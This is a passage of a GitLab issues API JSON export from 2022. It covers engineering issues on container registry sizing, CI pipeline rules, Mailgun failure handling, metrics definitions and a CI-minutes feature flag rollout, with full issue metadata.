Bauerly","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2799498/avatar.png","web_url":"https://gitlab.com/ameliabauerly"},"user_notes_count":7,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359137","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359137","notes":"https://gitlab.com/api/v4/projects/278964/issues/359137/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359137/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359137","relative":"#359137","full":"gitlab-org/gitlab#359137"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106665582,"iid":359127,"project_id":278964,"title":"Take into account container repository migration status when calculating size","description":"## Problem\n\nFound in https://gitlab.com/gitlab-org/gitlab/-/issues/350919#note_913137663.\n\nThe size of migrated container repositories is not being displayed in the UI/API as would be expected. This is because in the model [here](https://gitlab.com/gitlab-org/gitlab/-/blob/18ad8ce2be659088903db0dae10a6dc04f36092d/app/models/container_repository.rb#L474) we're returning early unless the repository was created after the Phase 1 start.\n\n## Solution\n\nNow that we're doing Phase 2 we must update the logic to also take into account the `migration_state` of the `ContainerRepository` instances. If this is `import_done`, then we should proceed with the size calculation.","state":"closed","created_at":"2022-04-14T19:16:53.202Z","updated_at":"2022-06-27T09:41:17.927Z","closed_at":"2022-06-27T09:41:17.655Z","closed_by":{"id":9516393,"username":"michelletorres","name":"Michelle Torres","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9516393/avatar.png","web_url":"https://gitlab.com/michelletorres"},"labels":["Category:Container Registry","Community contribution","Container Registry Migration","Container Registry Migration::Phase 2","[deprecated] Accepting merge requests","[deprecated] low hanging fruit","[deprecated] ðŸŽ","backend","devops::package","feature::enhancement","good for new contributors","group::package registry","ruby","section::ops","type::feature","workflow::production"],"milestone":{"id":2453024,"iid":74,"group_id":9970,"title":"15.2","description":"","state":"active","created_at":"2022-02-03T22:24:46.818Z","updated_at":"2022-02-03T22:26:32.010Z","due_date":"2022-07-17","start_date":"2022-06-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/74"},"assignees":[{"id":3289399,"username":"jeffpearce","name":"Jeff Pearce","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f3b050de6a8919b3446d70265b23da5c?s=80\u0026d=identicon","web_url":"https://gitlab.com/jeffpearce"}],"author":{"id":5054840,"username":"jdrpereira","name":"JoÃ£o Pereira","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5054840/avatar.png","web_url":"https://gitlab.com/jdrpereira"},"type":"ISSUE","assignee":{"id":3289399,"username":"jeffpearce","name":"Jeff Pearce","state":"active","avatar_url":"https://secure.gravatar.com/avatar/f3b050de6a8919b3446d70265b23da5c?s=80\u0026d=identicon","web_url":"https://gitlab.com/jeffpearce"},"user_notes_count":7,"merge_requests_count":0,"upvotes":2,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359127","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359127","notes":"https://gitlab.com/api/v4/projects/278964/issues/359127/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359127/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359127","relative":"#359127","full":"gitlab-org/gitlab#359127"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106664569,"iid":359126,"project_id":278964,"title":"The package-and-qa job should run when there are updates to the yarn.lock file","description":"Discovered during incident: https://gitlab.com/gitlab-com/gl-infra/production/-/issues/6841\n\nWe introduced a new dependency to our yarn.lock file that was unable to be appropriately tested against our current omnibus builds: https://gitlab.com/gitlab-org/gitlab/-/merge_requests/77861\n\nWhile the root cause is that we have a discrepency between the version of node that is being asked to build our various components, the `package-and-qa` job may have discovered this issue.  Currently it is a manual job.\n\n## Proposal\n\nEnforce that the `package-and-qa` job be run anytime the `yarn.lock` file is run, and ensure the job is mandatory to pass successfully prior to allowing an MR to be merged.","state":"closed","created_at":"2022-04-14T18:45:35.182Z","updated_at":"2022-04-19T17:00:38.612Z","closed_at":"2022-04-19T17:00:38.591Z","closed_by":{"id":128633,"username":"rymai","name":"RÃ©my Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"},"labels":["Engineering Productivity","ci-build","corrective action","ep::pipeline","frontend","maintenance::pipelines","priority::1","type::maintenance","workflow::in dev"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":128633,"username":"rymai","name":"RÃ©my Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"}],"author":{"id":2524675,"username":"skarbek","name":"John Skarbek","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c6455ce4726023aac6dd7fb0acd1f236?s=80\u0026d=identicon","web_url":"https://gitlab.com/skarbek"},"type":"ISSUE","assignee":{"id":128633,"username":"rymai","name":"RÃ©my Coutable","state":"active","avatar_url":"https://secure.gravatar.com/avatar/263da227929cc0035cb0eba512bcf81a?s=80\u0026d=identicon","web_url":"https://gitlab.com/rymai"},"user_notes_count":4,"merge_requests_count":0,"upvotes":1,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359126","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359126","notes":"https://gitlab.com/api/v4/projects/278964/issues/359126/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359126/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359126","relative":"#359126","full":"gitlab-org/gitlab#359126"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106664018,"iid":359123,"project_id":278964,"title":"Document _IMAGE_SUFFIX CI variable","description":"As part of the ~FIPS work, a new CI variable was introduced `_IMAGE_SUFFIX`. \nDocumentation is needed for this new variable. The ~documentation MR\nwas created, but is likely to miss inclusion in 15.0. This issue is\nhere to track it's progress.","state":"closed","created_at":"2022-04-14T18:22:50.694Z","updated_at":"2022-04-25T03:22:30.829Z","closed_at":"2022-04-19T23:13:39.691Z","closed_by":{"id":4310743,"username":"sethgitlab","name":"Seth Berger","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4310743/avatar.png","web_url":"https://gitlab.com/sethgitlab"},"labels":["Category:API Security","GitLab Ultimate","devops::secure","documentation","group::dynamic analysis","section::sec","type::feature","workflow::in review"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":6121997,"username":"mikeeddington","name":"Michael Eddington","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/6121997/avatar.png","web_url":"https://gitlab.com/mikeeddington"}],"author":{"id":6121997,"username":"mikeeddington","name":"Michael Eddington","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/6121997/avatar.png","web_url":"https://gitlab.com/mikeeddington"},"type":"ISSUE","assignee":{"id":6121997,"username":"mikeeddington","name":"Michael Eddington","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/6121997/avatar.png","web_url":"https://gitlab.com/mikeeddington"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359123","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359123","notes":"https://gitlab.com/api/v4/projects/278964/issues/359123/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359123/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359123","relative":"#359123","full":"gitlab-org/gitlab#359123"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106663214,"iid":359117,"project_id":278964,"title":"Automatically deactivate any e-mail address that has received a large number of failures","description":"## Problem\n\nThis is part of a larger effort to properly handle Mailgun suppressions -- https://gitlab.com/groups/gitlab-org/-/epics/7909+\n\n## Proposal\n\n* Automatically deactivate any e-mail address that has received a large number of failures.","state":"closed","created_at":"2022-04-14T17:53:13.698Z","updated_at":"2022-09-21T12:00:46.145Z","closed_at":"2022-09-13T19:49:14.422Z","closed_by":{"id":3507264,"username":"donaldcook","name":"Donald Cook","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3507264/avatar.png","web_url":"https://gitlab.com/donaldcook"},"labels":["Deliverable","Eng-Consumer::Infrastructure","Eng-Producer::Development","Engineering Allocation","auto updated","backend","devops::plan","group::project management","infradev","missed-deliverable","missed:15.2","priority::2","section::dev","severity::3","type::feature","workflow::verification"],"milestone":{"id":2453026,"iid":76,"group_id":9970,"title":"15.4","description":"[GitLab 15.4 Release](https://gitlab.com/gitlab-org/gitlab/-/releases/v15.4.0-ee)","state":"active","created_at":"2022-02-03T22:29:22.015Z","updated_at":"2022-09-29T02:21:26.561Z","due_date":"2022-09-17","start_date":"2022-08-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/76"},"assignees":[{"id":2880930,"username":"engwan","name":"Heinrich Lee Yu","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2880930/avatar.png","web_url":"https://gitlab.com/engwan"}],"author":{"id":4303289,"username":"gweaver","name":"Gabe Weaver","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4303289/avatar.png","web_url":"https://gitlab.com/gweaver"},"type":"ISSUE","assignee":{"id":2880930,"username":"engwan","name":"Heinrich Lee Yu","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2880930/avatar.png","web_url":"https://gitlab.com/engwan"},"user_notes_count":8,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359117","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359117","notes":"https://gitlab.com/api/v4/projects/278964/issues/359117/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359117/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359117","relative":"#359117","full":"gitlab-org/gitlab#359117"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7909,"epic":{"id":499695,"iid":7909,"title":"Use Mailgun Webhook to disable notifications and inform user of suppressions","url":"/groups/gitlab-org/-/epics/7909","group_id":9970,"human_readable_end_date":"Sep 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106663142,"iid":359116,"project_id":278964,"title":"Start tracking the number of failure counts for `NotificationService` emails","description":"## Problem\n\nThis is part of a larger effort to properly handle Mailgun suppressions -- https://gitlab.com/groups/gitlab-org/-/epics/7909+\n\n## Proposal\n\n- Start tracking the number of failure counts for `NotificationService` emails. If we see 100 failures in a row, for example, there's a good chance that we should inactivate this e-mail address.\n\n## Implementation\n\n* Add a new counter to the user object.\n* Increment the counter each time a WebHook request is received for this email address with a payload that represents permanent failure.","state":"closed","created_at":"2022-04-14T17:50:59.637Z","updated_at":"2022-07-28T22:26:22.842Z","closed_at":"2022-07-28T22:26:22.826Z","closed_by":{"id":3507264,"username":"donaldcook","name":"Donald Cook","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3507264/avatar.png","web_url":"https://gitlab.com/donaldcook"},"labels":["missed:15.1","missed:15.2","workflow::in review"],"milestone":{"id":2453025,"iid":75,"group_id":9970,"title":"15.3","description":"","state":"active","created_at":"2022-02-03T22:28:50.229Z","updated_at":"2022-02-03T22:28:50.229Z","due_date":"2022-08-17","start_date":"2022-07-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/75"},"assignees":[{"id":2880930,"username":"engwan","name":"Heinrich Lee Yu","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2880930/avatar.png","web_url":"https://gitlab.com/engwan"}],"author":{"id":4303289,"username":"gweaver","name":"Gabe Weaver","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4303289/avatar.png","web_url":"https://gitlab.com/gweaver"},"type":"ISSUE","assignee":{"id":2880930,"username":"engwan","name":"Heinrich Lee Yu","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2880930/avatar.png","web_url":"https://gitlab.com/engwan"},"user_notes_count":13,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359116","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359116","notes":"https://gitlab.com/api/v4/projects/278964/issues/359116/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359116/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359116","relative":"#359116","full":"gitlab-org/gitlab#359116"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7909,"epic":{"id":499695,"iid":7909,"title":"Use Mailgun Webhook to disable notifications and inform user of suppressions","url":"/groups/gitlab-org/-/epics/7909","group_id":9970,"human_readable_end_date":"Sep 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106662882,"iid":359113,"project_id":278964,"title":"Make it possible to handle both Mailgun's temporary and permanent failure hooks.","description":"## Problem\n\nThis is an `infradev` item because we had a week-long incident where e-mail notifications were delayed. We think the large number of Mailgun failures (both temporary and permanent) might have quietly induced a large build-up of retries on Mailgun's side. Usually Mailgun will add a permanent suppression to avoid affecting our sending reputation, but in this case we saw large number of temporary failures that should have caused us to stop sending notifications\n\n## Proposal\n\n- Make it possible to handle both Mailgun's temporary and permanent failure hooks.\n- Related code: https://gitlab.com/gitlab-org/gitlab/blob/9c8a128ea056ee9170c7a32ad28a65900ec873aa/app/services/members/mailgun/process_webhook_service.rb\n\n## Engineering breakdown\n\nThings we'll need to do here:\n\n1. Redirect / alias `/-/members/mailgun/permanent_failures` to a more generic `/-/mailgun/permanent_failures`\n1. Add `/-/mailgun/temporary_failures` or we could just make this one endpoint to handle both if payload has data to identify if it's a temporary or permanent failure\n1. For these new endpoints, detect \"invite email\" failures and call `Members::Mailgun::ProcessWebhookService` on those. For the other failures, we will handle them in the next issue","state":"closed","created_at":"2022-04-14T17:43:25.299Z","updated_at":"2022-06-02T12:49:48.514Z","closed_at":"2022-05-18T23:37:38.301Z","closed_by":{"id":2880930,"username":"engwan","name":"Heinrich Lee Yu","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2880930/avatar.png","web_url":"https://gitlab.com/engwan"},"labels":["Eng-Consumer::Infrastructure","Eng-Producer::Development","Engineering Allocation","auto updated","backend","devops::plan","group::project management","infradev","priority::2","section::dev","severity::3","type::feature","workflow::in review"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":2880930,"username":"engwan","name":"Heinrich Lee Yu","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2880930/avatar.png","web_url":"https://gitlab.com/engwan"}],"author":{"id":4303289,"username":"gweaver","name":"Gabe Weaver","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4303289/avatar.png","web_url":"https://gitlab.com/gweaver"},"type":"ISSUE","assignee":{"id":2880930,"username":"engwan","name":"Heinrich Lee Yu","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2880930/avatar.png","web_url":"https://gitlab.com/engwan"},"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359113","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359113","notes":"https://gitlab.com/api/v4/projects/278964/issues/359113/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359113/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359113","relative":"#359113","full":"gitlab-org/gitlab#359113"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7909,"epic":{"id":499695,"iid":7909,"title":"Use Mailgun Webhook to disable notifications and inform user of suppressions","url":"/groups/gitlab-org/-/epics/7909","group_id":9970,"human_readable_end_date":"Sep 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106649629,"iid":359102,"project_id":278964,"title":"Add format to product_group field in metrics definition and update incorrect values","description":"## Summary\n\nAdd format `group::\u003cgroup name\u003e` to Service Ping metrics definitions\n\nUpdate inconsistent values\n\n## Why\n\nThese values are used in queries and we expect to be consistent with the way we define the values.\n\n## Resources\n\n- Metrics dictionary guide https://docs.gitlab.com/ee/development/service_ping/metrics_dictionary.html\n- Metrics definition JSON schema https://gitlab.com/gitlab-org/gitlab/-/blob/master/config/metrics/schema.json\n\n## Testing\n\nUpdate relevant unit tests if any.","state":"closed","created_at":"2022-04-14T15:09:07.154Z","updated_at":"2022-07-05T18:45:14.563Z","closed_at":"2022-07-05T18:45:14.549Z","closed_by":{"id":8013274,"username":"pskorupa","name":"Piotr Skorupa","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8013274/avatar.png","web_url":"https://gitlab.com/pskorupa"},"labels":["backend","devops::analytics","feature::consolidation","group::product intelligence","missed:15.1","product intelligence::onboarding issue","quad-planning::complete-action","section::analytics","type::feature","workflow::in review"],"milestone":{"id":2453024,"iid":74,"group_id":9970,"title":"15.2","description":"","state":"active","created_at":"2022-02-03T22:24:46.818Z","updated_at":"2022-02-03T22:26:32.010Z","due_date":"2022-07-17","start_date":"2022-06-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/74"},"assignees":[{"id":8013274,"username":"pskorupa","name":"Piotr Skorupa","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8013274/avatar.png","web_url":"https://gitlab.com/pskorupa"}],"author":{"id":5365921,"username":"alinamihaila","name":"Alina Mihaila","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5365921/avatar.png","web_url":"https://gitlab.com/alinamihaila"},"type":"ISSUE","assignee":{"id":8013274,"username":"pskorupa","name":"Piotr Skorupa","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8013274/avatar.png","web_url":"https://gitlab.com/pskorupa"},"user_notes_count":17,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359102","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359102","notes":"https://gitlab.com/api/v4/projects/278964/issues/359102/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359102/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359102","relative":"#359102","full":"gitlab-org/gitlab#359102"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6522,"epic":{"id":321040,"iid":6522,"title":"Scalable Metrics Dictionary","url":"/groups/gitlab-org/-/epics/6522","group_id":9970,"human_readable_end_date":"Dec 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":106646672,"iid":359096,"project_id":278964,"title":"Remove unused computed prop `shouldDisplayFilters`","description":"## Background\n\nThe following discussion from !84025 should be addressed:\n\n- [ ] @cngo started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/84025#note_912611147): \n\n    \u003e Not part of this MR, but I noticed that `shouldDisplayFilters` isn't used so can be deleted\n\n## Possible solution\n* [x] Remove `shouldDisplayFilters`\n* [x] We might also be able to remove the `errorCode` state item","state":"closed","created_at":"2022-04-14T14:13:01.027Z","updated_at":"2022-07-14T06:43:57.550Z","closed_at":"2022-05-23T17:44:18.760Z","closed_by":{"id":2410096,"username":"JonstonChan","name":"Jonston Chan","state":"active","avatar_url":"https://secure.gravatar.com/avatar/6dbe2781758eec51d1e476e10487e5f6?s=80\u0026d=identicon","web_url":"https://gitlab.com/JonstonChan"},"labels":["Category:Value Stream Management","auto updated","devops::manage","frontend","frontend-weight::1","group::optimize","javascript","maintenance::refactor","section::dev","type::maintenance","workflow::in review"],"milestone":{"id":2453022,"iid":73,"group_id":9970,"title":"15.1","description":"","state":"active","created_at":"2022-02-03T22:23:29.335Z","updated_at":"2022-02-03T22:23:29.335Z","due_date":"2022-06-17","start_date":"2022-05-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/73"},"assignees":[{"id":2410096,"username":"JonstonChan","name":"Jonston Chan","state":"active","avatar_url":"https://secure.gravatar.com/avatar/6dbe2781758eec51d1e476e10487e5f6?s=80\u0026d=identicon","web_url":"https://gitlab.com/JonstonChan"}],"author":{"id":3397881,"username":"ekigbo","name":"Ezekiel Kigbo","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3397881/avatar.png","web_url":"https://gitlab.com/ekigbo"},"type":"ISSUE","assignee":{"id":2410096,"username":"JonstonChan","name":"Jonston Chan","state":"active","avatar_url":"https://secure.gravatar.com/avatar/6dbe2781758eec51d1e476e10487e5f6?s=80\u0026d=identicon","web_url":"https://gitlab.com/JonstonChan"},"user_notes_count":8,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/359096","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":3,"completed_count":2},"weight":1,"blocking_issues_count":0,"has_tasks":true,"task_status":"2 of 3 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/359096","notes":"https://gitlab.com/api/v4/projects/278964/issues/359096/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/359096/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#359096","relative":"#359096","full":"gitlab-org/gitlab#359096"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":106645365,"iid":359094,"project_id":278964,"title":"[Feature flag] Rollout of `ci_minutes_cost_factor_for_all_public_projects`","description":"\u003c!-- Title suggestion: [Feature flag] Enable description of feature --\u003e\n\n## Summary\n\nThis issue is to rollout https://gitlab.com/gitlab-org/gitlab/-/issues/243722+ on production,\nthat is currently behind the `ci_minutes_cost_factor_for_all_public_projects ` feature flag.\n\n**Release Plan** \n\n1. Release the change behind a feature flag so we can control exactly when to enable it.\n1. After the feature flag is enabled and before we remove it: set `public_projects_minutes_cost_factor: 0.008` for SaaS-only shared-runners. For this we could get a Gitlab.com admin to change the cost factor for each shared runner from `0` to `0.008`.\n1. Remove feature flag.\n1. Remove the `Project#force_cost_factor?` method.\n\n\u003c!-- Short description of what the feature is about and link to relevant other issues. --\u003e\n\n## Owners\n\n- Team: ~\"group::pipeline execution\" \n- Most appropriate slack channel to reach out to: `#g_pipeline-execution`\n- Best individual to reach out to: @fabiopitino \n- PM: @jheimbuck_gl \n\n## Stakeholders\n\n\u003c!--\nAre there any other stages or teams involved that need to be kept in the loop?\n\n- Name of a PM\n- The Support Team\n- The Delivery Team\n--\u003e\n\n## Expectations\n\n### What are we expecting to happen?\n\nBefore this FF release:\n- public projects inside namespaces created before July 2021 can use unlimited CI minutes due to a cost factor `0` applied to the duration of jobs executed by shared runners.\n- public projects inside namespaces created **after** July 2021 get a cost factor `0.008` applied which gets the CI minutes be consumed at a slow rate.\n\nAfter this FF release:\n- We apply a CI minutes cost factor `0.008` to all public projects using shared runners, regardless of the date when the namespace of the public project was created.\n\nA cost factor `\u003e 0` such as `0.008` ensures that users don't have anymore unlimited CI minutes while at the same time yield enough shared runners minutes due to the low rate. In the future we will increase this cost factor up to `1.0`.\n\n### When is the feature viable?\n\nWe have sent out notifications to affected users telling them that we enable the feature flag on **June 1st**. We should not enable the feature flag before that date.\n\n### What might happen if this goes wrong?\n\nThe cost factor `0` remains applied to old public projects.\n\n### What can we monitor to detect problems with this?\n\n* Sentry for any unexpected errors\n\n### What can we check for monitoring production after rollouts?\n\n* Count of projects with `ci_project_monthly_usages.amount_used = 0` to stop. For new month we should not expect any entries.\n\n## Rollout Steps\n\n### Rollout on non-production environments\n\n- Ensure that the feature MRs have been deployed to non-production environments.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- [x] Enable the feature globally on non-production environments.\n    - [x] `/chatops run feature set \u003cfeature-flag-name\u003e true --dev`\n    - [x] `/chatops run feature set \u003cfeature-flag-name\u003e true --staging`\n- [x] Verify that the feature works as expected. Posting the QA result in this issue is preferable.\n      The best environment to validate the feature in is [staging-canary](https://about.gitlab.com/handbook/engineering/infrastructure/environments/#staging-canary)\n      as this is the first environment deployed to. Note you will need to make sure you are configured to use canary as outlined [here](https://about.gitlab.com/handbook/engineering/infrastructure/environments/canary-stage/)\n      when accessing the staging environment in order to make sure you are testing appropriately.\n\n### Specific rollout on production\n\n- Ensure that the feature MRs have been deployed to both production and canary.\n    - [x] `/chatops run auto_deploy status \u003cmerge-commit-of-your-feature\u003e`\n- If you're using [project-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [x] `/chatops run feature set --project=gitlab-org/gitlab \u003cfeature-flag-name\u003e true`\n    - [x] `/chatops run feature set --project=gitlab-org/gitlab-foss \u003cfeature-flag-name\u003e true`\n    - [x] `/chatops run feature set --project=gitlab-com/www-gitlab-com \u003cfeature-flag-name\u003e true`\n- If you're using [group-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --group=gitlab-org \u003cfeature-flag-name\u003e true`\n    - [ ] `/chatops run feature set --group=gitlab-com \u003cfeature-flag-name\u003e true`\n- If you're using [user-actor](https://docs.gitlab.com/ee/development/feature_flags/#feature-actors), you must enable the feature on these entries:\n    - [ ] `/chatops run feature set --user=\u003cyour-username\u003e \u003cfeature-flag-name\u003e true`\n- [ ] Verify that the feature works on the specific entries. Posting the QA result in this issue is preferable.\n\n### Preparation before global rollout\n\n- [x] Check if the feature flag change needs to be accompanied with a\n  [change management issue](https://about.gitlab.com/handbook/engineering/infrastructure/change-management/#feature-flags-and-the-change-management-process).\n  Cross link the issue here if it does.\n- [x] Ensure that you or a representative in development can be available for at 